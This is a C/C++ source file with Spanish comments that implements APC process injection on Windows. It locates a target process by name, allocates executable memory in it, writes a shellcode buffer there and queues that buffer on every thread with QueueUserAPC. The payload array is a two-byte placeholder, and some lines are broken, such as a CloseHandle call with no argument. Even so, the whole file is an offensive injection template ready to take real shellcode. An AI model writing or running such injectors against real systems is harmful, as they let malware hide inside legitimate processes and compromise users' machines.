#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>
#include <vector>unsigned char my_payload[] = {0x00, 0x00}; unsigned int  my_payload_len = sizeof(my_payload);// Obtener el PID int findMyProc(const char* procname){	HANDLE         hSnapshot; 	PROCESSENTRY32 pe;	int			   pid = 0;	BOOL           hResult;	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);	if (INVALID_HANDLE_VALUE == hSnapshot) return 0;	pe.dwSize = sizeof(PROCESSENTRY32);	hResult = Process32First(hSnapshot, &pe);	while (hResult)	{		if (strcmp(procname, (const char*)pe.szExeFile) == 0)		{			pid = pe.th32ProcessID;			break;		}		hResult = Process32Next(hSnapshot, &pe);	}	CloseHandle(hSnapshot);	return pid;}// Encontrar hilos del proceso destino (subprocesos)DWORD getTids(DWORD pid, std::vector<DWORD>& tids){	HANDLE			hSnapshot;	THREADENTRY32	te;		te.dwSize = sizeof(THREADENTRY32);	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);	if (Thread32First(hSnapshot, &te))	{		do		{			if (pid == te.th32OwnerProcessID)			{				tids.push_back(te.th32ThreadID);			}		} while (Thread32Next(hSnapshot, &te));	}	CloseHandle(hSnapshot);	return !tids.empty();}int main(int argc, char* argv[]){	DWORD	pid = 0; 	HANDLE  ph;	HANDLE  ht; 	LPVOID  rb;	std::vector<DWORD> tids; 	pid = findMyProc(argv[1]);	if (pid == 0)	{		printf("PID not found :( exiting... \n");		return -1;	}	else	{		printf("PID = %d \n", pid);		ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, (DWORD)pid);		if (ph == NULL)		{			printf("OpenProcess failed! existing... \n");			return -2;		}	}	rb = VirtualAllocEx(ph, NULL, my_payload_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);	WriteProcessMemory(ph, rb, my_payload, my_payload_len, NULL);	if (getTids(pid, tids))	{		for (DWORD tid : tids)		{			HANDLE ht = OpenThread(THREAD_SET_CONTEXT, FALSE, tid);			if (ht)			{				QueueUserAPC((PAPCFUNC)rb, ht, NULL);				printf("payload injected via QueueUserAPC");				CloseHandle();			}		}		CloseHandle(ph);	}	return 0;}